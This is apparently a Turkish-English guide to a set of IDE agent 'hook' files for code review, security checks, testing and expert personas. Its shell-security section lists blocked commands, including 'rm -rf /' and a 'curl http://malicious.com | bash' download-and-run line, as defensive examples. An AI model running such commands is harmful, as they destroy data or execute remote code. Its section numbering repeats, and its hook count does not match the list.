# 🎯 ENTERPRISE AGENT HOOKS - COMPLETE GUIDE

## 📚 İÇİNDEKİLER

1. [Hooks Nedir?](#hooks-nedir)
2. [Hook Tipleri](#hook-tipleri)
3. [Enterprise Workflow Hooks](#enterprise-workflow-hooks)
4. [Quality & Security Hooks](#quality--security-hooks)
5. [Expert Role Hooks](#expert-role-hooks)
6. [Kullanım Örnekleri](#kullanım-örnekleri)
7. [Best Practices](#best-practices)

---

## 🎪 HOOKS NEDİR?

Agent Hooks, belirli olaylar gerçekleştiğinde otomatik olarak çalışan akıllı asistanlardır. Kod kalitesini, güvenliği ve geliştirme süreçlerini otomatikleştirir.

### Hook Event Tipleri

| Event | Ne Zaman Tetiklenir | Kullanım Amacı |
|-------|---------------------|----------------|
| `preToolUse` | Tool çalıştırılmadan önce | Güvenlik kontrolleri, validasyon |
| `postToolUse` | Tool çalıştırıldıktan sonra | Code review, kalite kontrol |
| `preTaskExecution` | Task başlamadan önce | Planlama, strateji belirleme |
| `postTaskExecution` | Task tamamlandıktan sonra | Test önerileri, performans analizi |
| `agentStop` | Agent durduğunda | Commit mesajı önerisi, özet |
| `userTriggered` | Kullanıcı manuel tetiklediğinde | Deployment checklist, security audit |

---

## 🏢 ENTERPRISE WORKFLOW HOOKS

### 1. 🏢 Enterprise Dev Workflow
**Dosya:** `enterprise-dev-workflow.kiro.hook`  
**Event:** `preTaskExecution`  
**Durum:** ✅ Enabled

**Ne yapar:**
- Tam enterprise development workflow'u aktive eder
- 7 farklı rol tanımlar (Product Owner, Frontend, Backend, UI/UX, DevOps, Security, QA)
- 6 aşamalı SDLC süreci (Planning → Implementation → QA → Review → Deployment → Monitoring)
- 5 quality gate kontrolü (Code Quality, Testing, Security, Performance, Documentation)
- Coding standards ve best practices
- Deployment stratejileri

**Ne zaman kullanılır:**
- Her task başlangıcında otomatik
- Enterprise seviyesinde profesyonel geliştirme için

---

### 2. 👥 Enterprise Dev Team
**Dosya:** `enterprise-dev-team.kiro.hook`  
**Event:** `preTaskExecution`  
**Durum:** ✅ Enabled

**Ne yapar:**
- 5 rol içeren world-class geliştirme ekibi simüle eder (Owner/PM, Frontend, Backend, UI/UX, QA)
- Görevleri role göre otomatik atar
- İteratif deliverable üretimi ve progress raporlaması
- Kod standartları, versiyon kontrolü, dokümantasyon ve review süreçleri

**Ne zaman kullanılır:**
- Ekip bazlı geliştirme simülasyonu için
- Rol odaklı task breakdown gerektiğinde

---

### 3. 👥 Enterprise Dev Team V2
**Dosya:** `enterprise-dev-team-v2.kiro.hook`  
**Event:** `preTaskExecution`  
**Durum:** ✅ Enabled

**Ne yapar:**
- Enterprise Dev Team'in geliştirilmiş versiyonu
- Genişletilmiş rol tanımları ve workflow iyileştirmeleri

**Ne zaman kullanılır:**
- Enterprise Dev Team'in güncel versiyonu olarak

---

### 4. 🏗️ Architecture Review
**Dosya:** `architecture-review.kiro.hook`  
**Event:** `preTaskExecution`  
**Durum:** ✅ Enabled

**Ne yapar:**
- Architectural Decision Record (ADR) formatı
- Alternatif çözümlerin değerlendirilmesi
- SOLID principles kontrolü
- Non-functional requirements analizi
- Scalability ve performance değerlendirmesi

**Ne zaman kullanılır:**
- Major architectural changes öncesi
- Design pattern seçimi gerektiğinde
- Microservices vs Monolithic kararı

---

## 🔒 QUALITY & SECURITY HOOKS

### 5. 🔍 Pre-Commit Quality Gate
**Dosya:** `pre-commit-quality-gate.kiro.hook`  
**Event:** `preToolUse` (write operations)  
**Durum:** ✅ Enabled

**Ne yapar:**
- Kod yazılmadan ÖNCE kalite kontrolleri
- Hardcoded secrets kontrolü
- Console.log/print statement kontrolü
- SQL injection vulnerability kontrolü
- Performance anti-pattern kontrolü

**Engellediği hatalar:**
```javascript
❌ const API_KEY = "sk-1234567890"  // Hardcoded secret
❌ console.log(userData)             // Debug statement
❌ eval(userInput)                   // Security risk
❌ for (let user of users) {         // N+1 query
     await db.query(...)
   }
```

---

### 4. 🔍 Post-Write Code Review
**Dosya:** `post-write-code-review.kiro.hook`  
**Event:** `postToolUse` (write operations)  
**Durum:** ✅ Enabled

**Ne yapar:**
- Kod yazıldıktan SONRA otomatik review
- 6 kategoride inceleme (Functionality, Quality, Performance, Security, Testing, Documentation)
- Improvement suggestions
- Production-ready confirmation

**Review kategorileri:**
1. Functionality: Edge cases, error handling
2. Code Quality: Readability, naming, complexity
3. Performance: Bottlenecks, algorithm efficiency
4. Security: Input validation, injection prevention
5. Testing: Test case suggestions
6. Documentation: Comments, API docs

---

### 5. 🔒 Security Audit on Shell Commands
**Dosya:** `security-audit-shell.kiro.hook`  
**Event:** `preToolUse` (shell operations)  
**Durum:** ✅ Enabled

**Ne yapar:**
- Shell komutları çalıştırılmadan önce güvenlik kontrolü
- Dangerous patterns tespiti
- Safe alternatives önerisi

**Engellediği tehlikeli komutlar:**
```bash
❌ rm -rf /
❌ chmod 777 file
❌ curl http://malicious.com | bash
❌ eval $USER_INPUT
❌ sudo rm -rf $UNQUOTED_VAR
```

---

### 6. 🚀 Pre-Deployment Checklist
**Dosya:** `pre-deployment-checklist.kiro.hook`  
**Event:** `userTriggered`  
**Durum:** ✅ Enabled

**Ne yapar:**
- Comprehensive deployment readiness validation
- 10 kritik kategori kontrolü
- Deployment strategy önerisi
- Rollback plan validation

**Kontrol kategorileri:**
1. Code Quality (tests, coverage, linting)
2. Security (vulnerabilities, secrets, headers)
3. Performance (load testing, response times)
4. Database (migrations, backups, indexes)
5. Infrastructure (env vars, monitoring, scaling)
6. Monitoring & Observability
7. Documentation
8. Compliance (GDPR, privacy)
9. Communication (stakeholders, release notes)
10. Rollback Plan

**Kullanım:**
```
Chat'te yaz: "Run pre-deployment checklist"
```

---

### 7. ♿ Accessibility Validator
**Dosya:** `accessibility-validator.kiro.hook`  
**Event:** `postToolUse` (write operations)  
**Durum:** ✅ Enabled

**Ne yapar:**
- WCAG 2.1 AA compliance kontrolü
- 4 prensip: Perceivable, Operable, Understandable, Robust
- ARIA best practices
- Color contrast validation
- Keyboard accessibility

**Kontrol edilen:**
```html
✅ <img src="logo.png" alt="Company Logo">
✅ <button aria-label="Close">×</button>
✅ <input id="email" type="email">
   <label for="email">Email</label>
✅ Color contrast ratio ≥ 4.5:1

❌ <img src="logo.png">  // Missing alt
❌ <div onclick="...">   // Not keyboard accessible
❌ <input type="text">   // Missing label
```

---

## 🧪 TESTING & PERFORMANCE HOOKS

### 8. 🧪 Auto Test Generator
**Dosya:** `auto-test-generator.kiro.hook`  
**Event:** `postTaskExecution`  
**Durum:** ✅ Enabled

**Ne yapar:**
- Task tamamlandıktan sonra test önerileri
- Test strategy (70% unit, 20% integration, 10% e2e)
- Test case generation
- Coverage goals (>80% line coverage)

**Önerilen test tipleri:**
```javascript
// Unit Tests
✓ Happy path test
✓ Invalid input test
✓ Null/undefined handling
✓ Edge cases
✓ Error scenarios

// Integration Tests
✓ API endpoint tests
✓ Database operations
✓ External service integrations

// E2E Tests
✓ Critical user journeys
✓ Complete workflows
```

---

### 9. 📊 Performance Monitoring
**Dosya:** `performance-monitoring.kiro.hook`  
**Event:** `postTaskExecution`  
**Durum:** ✅ Enabled

**Ne yapar:**
- Performance analysis ve optimization önerileri
- Frontend: Core Web Vitals (LCP, FID, CLS)
- Backend: API response times (p50, p95, p99)
- Database: Query optimization
- Resource utilization (CPU, Memory, Network)

**Performance targets:**
```
Frontend:
├─ LCP < 2.5s
├─ FID < 100ms
├─ CLS < 0.1
└─ Bundle size < 200KB

Backend:
├─ API p95 < 200ms
├─ Database query < 50ms
└─ Cache hit ratio > 80%
```

---

### 10. 📝 Git Commit Standards
**Dosya:** `git-commit-standards.kiro.hook`  
**Event:** `agentStop`  
**Durum:** ✅ Enabled

**Ne yapar:**
- Conventional commits formatı hatırlatması
- Commit message önerisi
- Best practices

**Format:**
```
<type>(<scope>): <subject>

<body>

<footer>
```

**Örnekler:**
```
feat(auth): add OAuth2 login support

Implemented OAuth2 authentication flow with Google and GitHub.
Added user session management and token refresh logic.

Closes #123
```

```
fix(api): resolve race condition in user creation

Fixed race condition that occurred when multiple requests
attempted to create the same user simultaneously.

Fixes #456
```

---

## 👥 EXPERT ROLE HOOKS (User Triggered)

### 11. 🔒 Security Expert
**Dosya:** `security-expert.kiro.hook`  
**Event:** `userTriggered`

**Expertise:**
- OWASP Top 10
- Penetration testing
- Cryptography (TLS/SSL, encryption)
- Compliance (GDPR, HIPAA, SOC2)
- Threat modeling (STRIDE, DREAD)

**Kullanım:**
```
"Activate security expert mode"
"Review this code for security vulnerabilities"
```

---

### 12. 🏗️ Architecture Expert
**Dosya:** `architecture-expert.kiro.hook`  
**Event:** `userTriggered`

**Expertise:**
- Microservices, Event-driven, CQRS
- Design patterns (Gang of Four)
- Distributed systems (CAP theorem)
- Scalability strategies
- API design (REST, GraphQL, gRPC)

**Kullanım:**
```
"I need architecture advice"
"Should I use microservices or monolithic?"
```

---

### 13. 🧪 QA & Testing Expert
**Dosya:** `qa-testing-expert.kiro.hook`  
**Event:** `userTriggered`

**Expertise:**
- Test automation (Jest, Cypress, Playwright)
- Test strategies (test pyramid)
- Performance testing (JMeter, k6)
- BDD (Cucumber)
- CI/CD testing

**Kullanım:**
```
"Help me with testing strategy"
"Generate test cases for this feature"
```

---

### 14. 🎨 Accessibility Expert
**Dosya:** `accessibility-expert.kiro.hook`  
**Event:** `userTriggered`

**Expertise:**
- WCAG 2.1 AA/AAA compliance
- Screen reader testing
- ARIA implementation
- Keyboard navigation
- Color contrast

---

### 15. 📱 Mobile Dev Expert
**Dosya:** `mobile-dev-expert.kiro.hook`  
**Event:** `userTriggered`

**Expertise:**
- iOS (Swift, SwiftUI)
- Android (Kotlin, Jetpack Compose)
- React Native, Flutter
- Mobile performance optimization
- App Store optimization

---

### 16. 🗄️ Database Expert
**Dosya:** `database-expert.kiro.hook`  
**Event:** `userTriggered`

**Expertise:**
- SQL optimization
- NoSQL design (MongoDB, Redis)
- Database sharding
- Indexing strategies
- Migration patterns

---

### 17. 🚀 DevOps/SRE Expert
**Dosya:** `devops-sre-expert.kiro.hook`  
**Event:** `userTriggered`

**Expertise:**
- CI/CD pipelines
- Kubernetes, Docker
- Infrastructure as Code (Terraform)
- Monitoring (Prometheus, Grafana)
- Incident response

---

### 18. 🎮 Game Dev Expert
**Dosya:** `game-dev-expert.kiro.hook`  
**Event:** `userTriggered`

**Expertise:**
- Unity, Unreal Engine
- Game physics and AI
- Multiplayer networking
- Performance optimization

---

### 19. 🤖 ML/AI Expert
**Dosya:** `ml-ai-expert.kiro.hook`  
**Event:** `userTriggered`

**Expertise:**
- Machine Learning algorithms
- Deep Learning (TensorFlow, PyTorch)
- Model training and deployment
- MLOps

---

### 20. 📊 Data Science Expert
**Dosya:** `data-science-expert.kiro.hook`  
**Event:** `userTriggered`

**Expertise:**
- Data analysis (Pandas, NumPy)
- Visualization (Matplotlib, Plotly)
- Statistical modeling
- Big Data (Spark, Hadoop)

---

### 21. 🔗 Blockchain/Web3 Expert
**Dosya:** `blockchain-web3-expert.kiro.hook`  
**Event:** `userTriggered`

**Expertise:**
- Smart contracts (Solidity)
- DeFi protocols
- NFT development
- Web3.js, Ethers.js

---

### 22. 🌐 API Design Expert
**Dosya:** `api-design-expert.kiro.hook`  
**Event:** `userTriggered`

**Expertise:**
- RESTful API design
- GraphQL schema design
- API versioning
- Rate limiting
- OpenAPI/Swagger

---

### 23. ⚡ Performance Expert
**Dosya:** `performance-expert.kiro.hook`  
**Event:** `userTriggered`

**Expertise:**
- Performance profiling
- Bottleneck identification
- Caching strategies
- Load testing
- Core Web Vitals optimization

---

### 24. 📝 Tech Writer Expert
**Dosya:** `tech-writer-expert.kiro.hook`  
**Event:** `userTriggered`

**Expertise:**
- Technical documentation
- API documentation
- User guides
- README files
- Documentation as Code

---

### 25. 📦 Product Manager Expert
**Dosya:** `product-manager-expert.kiro.hook`  
**Event:** `userTriggered`

**Expertise:**
- Product roadmap
- User stories
- Feature prioritization
- Stakeholder management
- Metrics and KPIs

---

### 26. 🔌 IoT/Embedded Expert
**Dosya:** `iot-embedded-expert.kiro.hook`  
**Event:** `userTriggered`

**Expertise:**
- Embedded systems (C, C++)
- IoT protocols (MQTT, CoAP)
- Microcontrollers (Arduino, ESP32)
- Real-time systems

---

### 27. ⚖️ Tech Lawyer
**Dosya:** `tech-lawyer.kiro.hook`  
**Event:** `userTriggered`

**Expertise:**
- Software licensing
- GDPR compliance
- Terms of Service
- Privacy policies
- Intellectual property

---

### 28. 🧠 Tech Psychologist
**Dosya:** `tech-psychologist.kiro.hook`  
**Event:** `userTriggered`

**Expertise:**
- Developer burnout prevention
- Team dynamics
- Code review psychology
- Productivity optimization

---

### 29. 📦 Dependency Update Checker
**Dosya:** `dependency-update-checker.kiro.hook`  
**Event:** `fileEdited` (package.json, requirements.txt, go.mod, Cargo.toml vb.)

**Ne yapar:**
- Güvenlik açığı olan bağımlılıkları tespit eder
- Outdated paketleri listeler
- Güvenli upgrade yolunu gösterir
- Lisans uyumluluğunu kontrol eder

---

### 30. ⚖️ License Compliance
**Dosya:** `license-compliance.kiro.hook`  
**Event:** `fileEdited` (package.json, requirements.txt, go.mod, Cargo.toml vb.)

**Ne yapar:**
- GPL/AGPL bağımlılıklarını tespit eder
- Ticari kullanım risklerini açıklar
- Lisans uyumsuzluklarını raporlar
- Güvenli alternatifler önerir

---

## 🎯 KULLANIM ÖRNEKLERİ

### Senaryo 1: Yeni Feature Geliştirme

```
1. Task başlar
   → enterprise-dev-workflow.kiro.hook aktif (otomatik)
   → architecture-review.kiro.hook aktif (otomatik)
   
2. Kod yazılmaya başlanır
   → pre-commit-quality-gate.kiro.hook kontrol eder (otomatik)
   
3. Kod yazıldı
   → post-write-code-review.kiro.hook review yapar (otomatik)
   → accessibility-validator.kiro.hook kontrol eder (otomatik)
   
4. Task tamamlandı
   → auto-test-generator.kiro.hook test önerir (otomatik)
   → performance-monitoring.kiro.hook analiz yapar (otomatik)
   
5. Agent durdu
   → git-commit-standards.kiro.hook mesaj önerir (otomatik)
```

---

### Senaryo 2: Production Deployment

```
1. Chat'te yaz: "Run pre-deployment checklist"
   → pre-deployment-checklist.kiro.hook çalışır
   
2. Tüm kontroller geçildi
   → Deployment onaylandı
   
3. Shell komutu çalıştırılacak
   → security-audit-shell.kiro.hook kontrol eder (otomatik)
```

---

### Senaryo 3: Security Audit

```
1. Chat'te yaz: "Activate security expert"
   → security-expert.kiro.hook aktif
   
2. Kod analizi yapılır
   → Vulnerabilities tespit edilir
   → Secure alternatives önerilir
   
3. Chat'te yaz: "Run pre-deployment checklist"
   → Security section detaylı kontrol edilir
```

---

### Senaryo 4: Architecture Decision

```
1. Chat'te yaz: "I need architecture advice"
   → architecture-expert.kiro.hook aktif
   
2. Task başlar
   → architecture-review.kiro.hook ADR formatı sunar
   
3. Alternatifler değerlendirilir
   → Best option seçilir
   → Trade-offs dokümante edilir
```

---

## 📊 HOOK KOMBİNASYONLARI

### Full Stack Development
```
Otomatik aktif:
├─ enterprise-dev-workflow (preTaskExecution)
├─ architecture-review (preTaskExecution)
├─ pre-commit-quality-gate (preToolUse - write)
├─ post-write-code-review (postToolUse - write)
├─ accessibility-validator (postToolUse - write)
├─ auto-test-generator (postTaskExecution)
├─ performance-monitoring (postTaskExecution)
└─ git-commit-standards (agentStop)

Manuel ekle:
├─ security-expert (complex security)
├─ architecture-expert (major decisions)
└─ qa-testing-expert (test strategy)
```

---

### API Development
```
Otomatik aktif:
├─ enterprise-dev-workflow
├─ pre-commit-quality-gate
├─ post-write-code-review
├─ auto-test-generator
└─ git-commit-standards

Manuel ekle:
├─ api-design-expert
├─ security-expert
└─ performance-expert
```

---

### Frontend Development
```
Otomatik aktif:
├─ enterprise-dev-workflow
├─ pre-commit-quality-gate
├─ post-write-code-review
├─ accessibility-validator (kritik!)
├─ performance-monitoring
└─ git-commit-standards

Manuel ekle:
├─ performance-expert (Core Web Vitals)
└─ accessibility-expert (WCAG compliance)
```

---

## 🎛️ HOOK YÖNETİMİ

### Hook'u Devre Dışı Bırakma

Dosyayı aç ve `enabled: false` yap:
```json
{
  "enabled": false,
  "name": "Hook Name",
  ...
}
```

---

### Hook'u Silme

```bash
rm .kiro/hooks/hook-name.kiro.hook
```

---

### Yeni Hook Oluşturma

1. Command Palette → "Open Kiro Hook UI"
2. Veya `.kiro/hooks/` klasörüne yeni `.kiro.hook` dosyası ekle

**Template:**
```json
{
  "enabled": true,
  "name": "My Custom Hook",
  "description": "What this hook does",
  "version": "1.0.0",
  "when": {
    "type": "preToolUse",
    "toolTypes": ["write"]
  },
  "then": {
    "type": "askAgent",
    "prompt": "Your instructions here..."
  }
}
```

---

## 🏆 BEST PRACTICES

### 1. Hook Overload'dan Kaçının
- Çok fazla hook performansı düşürür
- Sadece ihtiyacınız olanları aktif tutun
- Benzer hook'ları birleştirin

### 2. Doğru Event Seçin
- `preToolUse`: Validation, prevention
- `postToolUse`: Review, analysis
- `preTaskExecution`: Planning, strategy
- `postTaskExecution`: Testing, monitoring
- `userTriggered`: Manual checklists

### 3. Hook Prompt'ları Kısa Tutun
- Uzun prompt'lar context'i şişirir
- Sadece gerekli bilgiyi verin
- Checklist formatı kullanın

### 4. Circular Dependencies'den Kaçının
- preToolUse hook'u başka bir tool çağırmamalı
- Infinite loop'a sebep olabilir

### 5. Test Edin
- Yeni hook'u test ortamında deneyin
- Beklenmeyen davranışları gözlemleyin
- Gerekirse prompt'u optimize edin

---

## 📈 HOOK ETKİ MATRISI

| Hook | Etki Alanı | Frekans | Fayda | Performans Etkisi |
|------|------------|---------|-------|-------------------|
| enterprise-dev-workflow | Tüm tasks | Her task | ⭐⭐⭐⭐⭐ | Düşük |
| pre-commit-quality-gate | Write ops | Çok sık | ⭐⭐⭐⭐⭐ | Orta |
| post-write-code-review | Write ops | Çok sık | ⭐⭐⭐⭐ | Orta |
| security-audit-shell | Shell ops | Orta | ⭐⭐⭐⭐⭐ | Düşük |
| accessibility-validator | Write ops | Sık | ⭐⭐⭐⭐ | Düşük |
| auto-test-generator | Task end | Her task | ⭐⭐⭐⭐ | Düşük |
| performance-monitoring | Task end | Her task | ⭐⭐⭐⭐ | Düşük |
| pre-deployment-checklist | Manuel | Nadir | ⭐⭐⭐⭐⭐ | Orta |
| architecture-review | Task start | Her task | ⭐⭐⭐⭐ | Düşük |
| git-commit-standards | Agent stop | Her stop | ⭐⭐⭐ | Düşük |

---

## 🎉 SONUÇ

Bu Enterprise Agent Hooks sistemi ile:

✅ Kod kalitesi otomatik kontrol edilir
✅ Güvenlik açıkları önlenir
✅ Performance optimize edilir
✅ Accessibility sağlanır
✅ Testing coverage artar
✅ Deployment güvenli hale gelir
✅ Best practices otomatik uygulanır
✅ Expert knowledge her zaman erişilebilir

**Toplam 32 profesyonel hook ile enterprise seviyesinde geliştirme yapabilirsiniz!** 🚀
